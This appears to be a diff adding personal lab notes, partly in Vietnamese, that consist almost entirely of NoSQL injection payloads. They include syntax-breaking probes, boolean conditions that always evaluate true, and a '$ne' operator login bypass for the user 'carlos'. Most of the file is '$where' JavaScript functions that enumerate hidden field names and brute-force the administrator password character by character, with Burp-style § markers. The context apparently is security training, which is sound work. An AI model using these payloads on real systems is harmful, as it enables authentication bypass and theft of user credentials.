@@ -1,0 +1,36 @@
+'"`{
+;$Foo}
+$Foo \xYZ
+' && 0 && 'x
+' && 1 && 'x
+'||'1'=='1
+
+
+detect length admin passwd
+administrator' && this.password.length < 30 || 'a'=='b
+
+brute force
+administrator' && this.password[§0§]=='§a§
+
+
+
+Check các fields ẩn
+
+{"username":"carlos","password":{"$ne":""},
+
+
+"$where":"function(){ if(Object.keys(this)[0].match('_id')) return 1; else 0; }" 
+}
+
+"$where":"function(){ if(Object.keys(this)[2].length == 1) return 1; else 0; }" 
+}
+
+"$where":"function(){ if(Object.keys(this)[2].match(/^a/)) return 1; else 0; }" 
+}
+
+Sau khi đã biết tên
+"$where":"function(){ if(this.password.length == 1) return 1; else 0; }" 
+}
+Brute value
+"$where":"function(){ if(this.password.match(/^a/)) return 1; else 0; }" 
+}
